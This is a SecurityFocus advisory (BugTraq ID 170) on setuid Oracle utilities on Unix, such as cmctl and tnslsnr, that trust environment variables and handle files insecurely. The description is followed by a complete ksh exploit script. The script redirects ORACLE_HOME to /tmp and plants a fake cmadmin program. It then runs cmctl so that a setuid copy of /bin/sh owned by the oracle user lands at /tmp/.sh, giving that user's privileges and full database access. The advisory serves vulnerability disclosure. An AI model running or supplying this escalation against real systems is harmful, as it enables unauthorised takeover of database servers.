source: http://www.securityfocus.com/bid/170/info

A number of security file access security vulnerabilities in suid programs that are part of Oracle may be exploited to obtain the privileges of the 'oracle' user and full access to the database system. Only the Unix version of Oracle is vulnerable.

The following suid executables are believed to contain security vulnerabilities: lsnrctl, oemevent, onrsd, osslogin, tnslsnr, tnsping, trcasst, trcroute, cmctl, cmadmin, cmgw, names, namesctl, otrccref, otrcfmt, otrcrep, otrccol and oracleO. These files are owned by the oracle user and are suid.

The utilities implement insecure file creation and manipulation and they trust environment variables. These allow malicious users to create, append or overwrite files owned by the oracle user, as well as executing program as the oracle user. 

#! /usr/bin/ksh
#############################################
#
# cmctl is installed setuid to Oracle
# by default. See BugTraq ID 170 and Oracle
# bug id 701297 and 714293. 
#
# This script will create a setuid Oracle shell,
# /tmp/.sh
#

# redirect environment variables
export ORACLE_HOME=/tmp
export ORAHOME=/tmp

mkdir /tmp/bin
chmod a+rx /tmp/bin

# create cmadmin script
cat <<EOF > /tmp/bin/cmadmin
cp /bin/sh /tmp/.sh
chmod u+s /tmp/.sh
chmod a+rx /tmp/.sh
EOF

chmod a+rx /tmp/bin/cmadmin

# run cmctl to crete Oracle setuid shell
/oracle/products/V815/bin/cmctl start cmadmin